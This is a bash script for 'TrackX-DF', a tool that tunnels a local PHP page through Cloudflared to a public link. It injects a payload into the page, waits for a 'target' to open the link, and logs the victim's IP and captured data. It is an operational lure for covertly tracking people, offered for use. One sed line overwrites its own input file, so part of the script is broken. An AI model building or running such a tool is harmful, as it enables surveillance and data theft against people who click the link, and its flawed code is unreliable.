#!/bin/bash

trap 'printf "\n"; stop' 2

red='\e[31m'
green='\e[32m'
blue='\e[34m'
cyan='\e[36m'
yellow='\e[33m'
reset='\e[0m'

# عرض البانر
banner() {
    clear
    echo -e "${red}████████╗██████╗  █████╗  ██████╗██╗  ██╗${reset}"
    echo -e "${red}╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝${reset}"
    echo -e "${red}   ██║   ██████╔╝███████║██║     █████╔╝ ${reset}"
    echo -e "${red}   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ${reset}"
    echo -e "${red}   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗${reset}"
    echo -e "${red}   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝${reset}"
    echo -e "${cyan}-------------------------------------------${reset}"
    echo -e "${yellow}        Tool: ${green}TrackX-DF${reset}"
    echo -e "${yellow}        Developer: ${green}@A_Y_TR${reset}"
    echo -e "${yellow}        Channel: ${green}https://t.me/cybersecurityTemDF${reset}"
    echo -e "${yellow}        Version: ${green}v1.1${reset}"
    echo -e "${cyan}-------------------------------------------${reset}"
}


dependencies() {
    command -v php > /dev/null 2>&1 || { echo -e "${red}Error: PHP is not installed. Install it first.${reset}"; exit 1; }
    command -v wget > /dev/null 2>&1 || { echo -e "${red}Error: wget is not installed. Install it first.${reset}"; exit 1; }
}


stop() {
    for process in cloudflared php ssh; do
        if pgrep -x "$process" > /dev/null; then
            pkill -f -2 "$process"
        fi
    done
    exit 1
}


catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    if [[ ! -z "$ip" ]]; then
        echo -e "${yellow}[+] Target IP: ${green}$ip${reset}"
        cat ip.txt >> saved.ip.txt
        rm -rf ip.txt
    fi
}

# انتظار الضحية
checkfound() {
    echo -e "${cyan}[*] Waiting for target... (Press Ctrl + C to exit)${reset}"
    while true; do
        if [[ -e "ip.txt" ]]; then
            echo -e "${green}[+] Target opened the link!${reset}"
            catch_ip
            tail -f -n 110 data.txt
        fi
        sleep 0.5
    done
}

# إعداد وتشغيل Cloudflared
cf_server() {
    if [[ ! -e cloudflared ]]; then
        echo -e "${yellow}[+] Downloading Cloudflared...${reset}"
        arch=$(uname -m)
        case "$arch" in
            *'arm'* | *'Android'* ) 
                url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
                ;;
            *'aarch64'* ) 
                url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
                ;;
            *'x86_64'* ) 
                url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
                ;;
            * ) 
                url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
                ;;
        esac
        wget --no-check-certificate "$url" -O cloudflared > /dev/null 2>&1
        chmod +x cloudflared
    fi

    echo -e "${yellow}[+] Starting PHP server...${reset}"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2

    echo -e "${yellow}[+] Starting Cloudflared tunnel...${reset}"
    rm -f cf.log
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
    sleep 10

    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' cf.log)
    if [[ -z "$link" ]]; then
        echo -e "${red}[!] Failed to generate direct link.${reset}"
        exit 1
    else
        echo -e "${green}[+] Direct link: ${blue}$link${reset}"
    fi

    sed "s+forwarding_link+$link+g" template.php > index.php
    checkfound
}

# تشغيل السيرفر المحلي
local_server() {
    sed 's+forwarding_link+''+g' template.php > index.php
    echo -e "${yellow}[+] Starting PHP server on localhost:8080...${reset}"
    php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
    sleep 2
    checkfound
}

# الوظيفة الرئيسية
TrackXDF() {
    rm -f data.txt ip.txt
    touch data.txt
    sed -e '/tc_payload/r payload' index.html > index.html

    default_option_server="Y"
    read -p $'\n\e[1;93m Do you want to use Cloudflared tunnel? (Y/N) [Default: Y]: \e[0m' option_server
    option_server="${option_server:-${default_option_server}}"

    if [[ $option_server =~ ^(Y|y|Yes|yes)$ ]]; then
        cf_server
    else
        local_server
    fi
}


banner
dependencies
TrackXDF